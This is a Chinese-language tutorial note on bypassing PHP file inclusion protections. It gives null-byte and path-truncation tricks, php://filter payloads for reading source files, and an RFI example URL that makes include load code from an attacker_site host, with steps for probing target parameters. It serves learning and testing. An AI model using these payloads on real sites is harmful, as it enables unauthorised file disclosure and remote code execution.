## 1.文件包含漏洞的绕过

### 1.一些基础知识

#### 1.`/etc/passwd` 是什么？

1.全称：**password file**（密码文件，但现在不存真实密码）

##### 2.它的作用：

- 记录**系统里所有用户**的基本信息
- 登录、权限、UID、GID、家目录、默认 shell 都在这里

##### 3.任何用户**默认都能读**，所以是 LFI（本地文件包含）漏洞的**首选测试文件**。

##### 4.文件格式

```c
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
```

字段顺序固定：

1. **用户名**

2. **密码占位符**（x 表示密码存在 shadow 里）

3. **UID（用户 ID）**

4. **GID（组 ID）**

5. **注释信息**

6. **家目录**

7. **默认 shell**

#### 2.file() 函数

##### 1.定义和用法

file（） 函数把整个文件读入一个数组中。

数组中的每个元素都是文件中相应的一行，包括换行符在内。

##### 2.语法

file(path,include_path,context)

##### 3.参数

| path         | 必需。规定要读取的文件。                                     |
| ------------ | ------------------------------------------------------------ |
| include_path | 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 '1'。 |
| context      | 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 |

#### 3.原理

核心是**服务器端脚本（如 PHP）的文件包含函数（include/require 等）被攻击者可控的参数操纵**，导致服务器读取 / 执行了非预期的文件（本地或远程）

##### 1.防御方式

```php
<?php include($_GET['file'].".php"); ?>
```

##### 2.绕过方式

###### 1.空字节注入

1.PHP 早期版本会把 `%00`（URL 编码后的空字节）当作字符串结束符，后面的内容会被忽略。

2.代码拼接后变成：`shell.txt%00.php`（适用于 PHP < 5.3.4 版本）

​    PHP 解析时会忽略 `%00` 后的 `.php`，实际包含的是 `shell.txt`，成功绕过后缀限制。

###### 2.路径与点截断

1.部分服务器对文件路径的长度有上限（比如 Windows 是 256 字节，Linux 是 4096 字节），攻击者可以传超长的无用字符，让拼接的 `.php` 超出长度被截断：

2.构造参数：`?file=shell.txt/././././...（重复很多次）`

   拼接后路径长度超过服务器限制，`.php` 被截断，实际包含的还是 `shell.txt`。

###### ***3.PHP 封装器***（重点）

1.什么是PHP 封装器

PHP 封装器（PHP Stream Wrappers，也译作 “流包装器”）是 PHP 内置的一套**标准化接口 / 协议体系**，它的核心作用是：**让 PHP 能用统一的文件操作函数（比如 `fopen()`、`file_get_contents()`、`include()` 等），访问不同类型的 “资源”** —— 不管这个资源是本地文件、远程网络数据、内存中的数据，还是压缩文件里的内容。

2.**语法格式**：所有封装器都遵循 `协议名://资源标识` 的格式（比如 `file:///tmp/test.txt`、`http://www.baidu.com`）；

3.函数

| 封装器               | 核心用途                                                   | 示例代码                                                     |
| -------------------- | ---------------------------------------------------------- | ------------------------------------------------------------ |
| `file://`            | 访问本地文件系统（PHP 默认封装器，即使不写也会自动使用）   | `file_get_contents("file:///var/www/html/test.txt");`（读取 Linux 本地文件） |
| `http://`/`https://` | 访问远程 HTTP/HTTPS 资源（比如读取远程接口数据）           | `$data = file_get_contents("https://api.xxx.com/user/1");`   |
| `ftp://`             | 访问 FTP 服务器上的文件（上传 / 下载 / 读取）              | `$fp = fopen("ftp://user:pass@ftp.xxx.com/test.txt", "r");`  |
| `php://`             | 访问 PHP 自身的输入 / 输出、内存、过滤数据（PHP 核心内置） | - `php://input`：读取 POST 请求的原始数据- `php://filter`：过滤文件内容（比如转编码） |
| `zip://`             | 直接访问 ZIP 压缩包内的文件（无需解压）                    | `file_get_contents("zip:///tmp/test.zip#test.txt");`（读取 zip 里的 test.txt） |
| `data://`            | 直接在代码中嵌入数据（把数据当作 “文件内容” 读取）         | `$content = file_get_contents("data://text/plain;charset=utf-8,你好世界");` |

4.绕过原理

 1：封装器的 “协议优先级” 高于文件名后缀

PHP 解析 `include` 路径时，会优先识别 `xxx://` 格式的**协议头**，而非普通文件名。

- 正常情况：`include("test.php")` → 解析为 “本地文件 test.php”；
- 封装器场景：`include("php://filter/resource=test.php")` → 解析为 “通过 php://filter 协议读取 test.php 文件”；

当代码拼接 `.php` 时，只要封装器的协议语法完整，拼接的 `.php` 要么变成 “协议参数的一部分”，要么被封装器的逻辑忽略，完全不影响协议执行。

2：封装器的 “资源指向” 脱离 “文件名规则”

普通文件名需要符合 “xxx. 后缀” 的格式，但封装器的 `resource=` 参数可以指向**任意资源**（文件、内存、网络数据），拼接的 `.php` 只会成为 `resource` 参数的一部分，而非 “文件名后缀”。

比如：

- 用户传：`file=php://filter/convert.base64-encode/resource=config`
- 代码拼接后：`php://filter/convert.base64-encode/resource=config.php`
- PHP 解析：`resource=config.php` 是封装器的 “参数”，表示 “读取 config.php 文件”，而非 “文件名是 php://filter/...config.php”。

### 3远程文件包含

#### 1.什么是远程文件包含

攻击者把恶意代码放在自己的服务器上，诱导目标服务器通过 `include` 读取并执行这个远程文件，从而控制目标服务器。

#### 2.测试方法

于 RFI 发生在传递 “include” 语句的路径未被妥善净化时，在黑箱测试中，我们应寻找以文件名为参数的脚本。

测试思路：找 URL 里带 `file`/`page`/`path` 等参数的脚本（比如 `?file=xxx`），这些参数大概率是传给 `include` 函数的，是 RFI 漏洞的高危特征。

```php+HTML
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

因此这段代码片段容易受到此类攻击。请考虑以下URL：

```php
http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page
```

#### 3.测试原理

1.**URL 里的 `?file=xxx`/`?page=xxx`/`?path=xxx` 这类参数，本质是网站把 “要加载的文件路径” 暴露在 URL 里，而如果后台用 `include()` 处理这个参数，就大概率存在 RFI/LFI 漏洞**。

2.举个通俗例子：

- 网站想加载不同页面（比如首页、关于页），开发者图省事，会写 `include($_GET['page'].".php")`，然后用 `?page=home` 加载 `home.php`；
- 这个 `page` 参数就是 “文件路径参数”—— 开发者如果没做限制，攻击者就能把 `page` 的值改成远程文件地址（比如 `http://攻击者服务器/恶意文件`），触发 RFI 漏洞。

#### 4.实际测试中怎么做？

##### 步骤 1：

收集目标网站的所有 URL，筛选含 “文件类参数” 的链接

**手动浏览**：点击网站的不同页面，观察地址栏 URL，比如：

http://target.com/index.php?page=home

正常链接： 脚本名：`index.php`（网站首页，核心业务脚本）

​                 \- 参数名：`page`（语义是 “页面”，偏向 “业务逻辑切换”）

​                 - 业务场景：加载网站内置页面（如首页、关于页）

http://target.com/index.php?page=home

可疑链接： 脚本名：`load.php`（语义是 “加载”，偏向 “文件加载逻辑”）

​                    \- 参数名：`file`（语义是 “文件”，直接指向 “文件路径”）

​                    - 业务场景：加载指定文件（如 `news.php`）

http://target.com/view.php?path=about

高危链接：\- 脚本名：`view.php`（语义是 “查看”，偏向 “文件查看 / 读取”）

​                   - 参数名：`path`（语义是 “路径”，直接指向 “文件路径”，支持跨目录）

​                   - 业务场景：查看指定路径的文件

**工具辅助**：用 Burp Suite 的 “爬虫” 功能爬取网站所有链接，或用 OWASP ZAP 扫描，筛选出含上述参数的 URL。

##### 步骤 2：

验证参数是否传给 `include()` 函数（核心验证）

先访问 `http://target.com/vuln.php?file=不存在的文件名`（比如 `?file=abc123`）；

观察页面响应：

- 如果出现 `Warning: include(abc123.php): Failed to open stream` 这类报错 → 说明后台确实用 `include()` 处理这个参数，高危！
- 如果只是 404 / 空白页 → 可能不是 `include()` 处理，风险较低。

##### 步骤 3：

测试是否能触发 RFI 漏洞

自己写php脚本，并拼接到URL中，观察反馈

##### 步骤 4：

（补充）如果 RFI 不行，测试 LFI
